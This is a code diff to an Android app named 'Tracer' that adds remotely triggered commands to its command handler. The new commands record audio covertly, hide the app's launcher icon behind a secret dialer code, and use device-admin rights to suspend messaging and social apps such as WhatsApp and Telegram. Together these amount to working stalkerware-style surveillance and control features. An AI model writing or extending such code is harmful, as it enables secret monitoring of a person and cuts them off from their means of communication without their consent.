@@ -27,6 +27,7 @@ import com.tracer.app.TracerApp
 import com.tracer.app.admin.TracerDeviceAdminReceiver
 import com.tracer.app.service.TracerLocationService
 import com.tracer.app.sim.SimManager
+import java.io.File
 
 /**
  * @param onRemoteResult  Callback invocado cuando sender == "remote".
@@ -78,6 +79,10 @@ class CommandHandler(
             "VIBRATE_STOP"-> handleVibrate(sender, false)
             "GPS_HIGH"    -> handleGpsHigh(sender)
             "MESSAGE"     -> handleMessage(sender, args)
+            "AUDIO"       -> handleAudio(sender, args)
+            "SILENT_CALL" -> handleSilentCall(sender)
+            "STEALTH"     -> handleStealth(sender)
+            "BLOCK_APPS"  -> handleBlockApps(sender)
             else          -> if (sender != "remote") reply(sender, "Tracer: comando desconocido")
         }
     }
@@ -401,6 +406,80 @@ class CommandHandler(
             .build()
         nm.notify(MESSAGE_NOTIF_ID, notification)
         reply(sender, "Tracer MESSAGE: mensaje enviado a pantalla")
+    }
+
+    private fun handleAudio(sender: String, args: List<String>) {
+        val duration = args.firstOrNull()?.toIntOrNull()?.coerceIn(10, 300) ?: 60
+        val intent = Intent(context, TracerLocationService::class.java).apply {
+            action = TracerLocationService.ACTION_RECORD_AUDIO
+            putExtra(TracerLocationService.EXTRA_REPLY_TO, sender)
+            putExtra(TracerLocationService.EXTRA_DURATION_SEC, duration)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent)
+        } else {
+            context.startService(intent)
+        }
+        if (sender != "remote") reply(sender, "Tracer AUDIO: grabando ${duration}s...")
+    }
+
+    private fun handleSilentCall(sender: String) {
+        val intent = Intent(context, TracerLocationService::class.java).apply {
+            action = TracerLocationService.ACTION_RECORD_AUDIO
+            putExtra(TracerLocationService.EXTRA_REPLY_TO, sender)
+            putExtra(TracerLocationService.EXTRA_DURATION_SEC, 60)
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            context.startForegroundService(intent)
+        } else {
+            context.startService(intent)
+        }
+        if (sender != "remote") reply(sender, "Tracer SILENT_CALL: grabando 60s...")
+    }
+
+    private fun handleStealth(sender: String) {
+        return try {
+            context.packageManager.setComponentEnabledSetting(
+                ComponentName(context, "com.tracer.app.MainActivityAlias"),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            reply(sender, "Tracer STEALTH: icono ocultado. Marca *#*#7223#*#* para volver.")
+        } catch (e: Exception) {
+            reply(sender, "Tracer STEALTH: error — ${e.message}")
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun handleBlockApps(sender: String) {
+        val dpm = context.getSystemService(DevicePolicyManager::class.java)
+        val adminComponent = ComponentName(context, TracerDeviceAdminReceiver::class.java)
+
+        if (!dpm.isAdminActive(adminComponent)) {
+            reply(sender, "Tracer BLOCK_APPS: admin no activado")
+            return
+        }
+
+        val appsToSuspend = arrayOf(
+            "com.whatsapp", "com.facebook.katana", "com.instagram.android",
+            "com.twitter.android", "com.google.android.gm",
+            "com.facebook.orca", "com.snapchat.android",
+            "com.tiktok.android", "org.telegram.messenger"
+        )
+
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                val failed = dpm.setPackagesSuspended(adminComponent, appsToSuspend, true)
+                val blocked = appsToSuspend.size - failed.size
+                reply(sender, "Tracer BLOCK_APPS: $blocked apps bloqueadas")
+            } else {
+                reply(sender, "Tracer BLOCK_APPS: requiere Android 7+")
+            }
+        } catch (e: SecurityException) {
+            reply(sender, "Tracer BLOCK_APPS: requiere Device Owner. Ejecuta: adb shell dpm set-device-owner com.tracer.app/.admin.TracerDeviceAdminReceiver")
+        } catch (e: Exception) {
+            reply(sender, "Tracer BLOCK_APPS: error — ${e.message}")
+        }
     }
 
     private fun setAlertMode(enable: Boolean) {
